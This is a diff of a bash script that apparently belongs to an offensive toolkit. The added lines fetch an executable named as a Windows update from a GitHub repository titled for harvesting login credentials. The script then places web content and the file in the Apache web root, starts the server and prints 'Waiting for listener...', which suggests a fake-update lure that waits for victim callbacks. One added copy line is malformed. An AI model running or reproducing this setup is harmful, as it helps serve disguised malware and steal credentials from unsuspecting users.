@@ -45,8 +45,9 @@ read x
 
 # 1
 if [ "$x" == "$exe" ]; then 
-cp  > UPDATEE101.exe
-	mv UPDATEE101.exe /var/www/html
+cd /opt/
+wget https://github.com/nu11secur1ty/SSTC-HTTPS-login-credentials/raw/master/hosts/windows/UPDATE-1903.exe
+cp  > UPDATEE101.exe /var/www/html
 	cp -avr shimazu_module/Microupdate/* /var/www/html
 	systemctl start apache2.service
 echo -e 'Waiting for listener...'
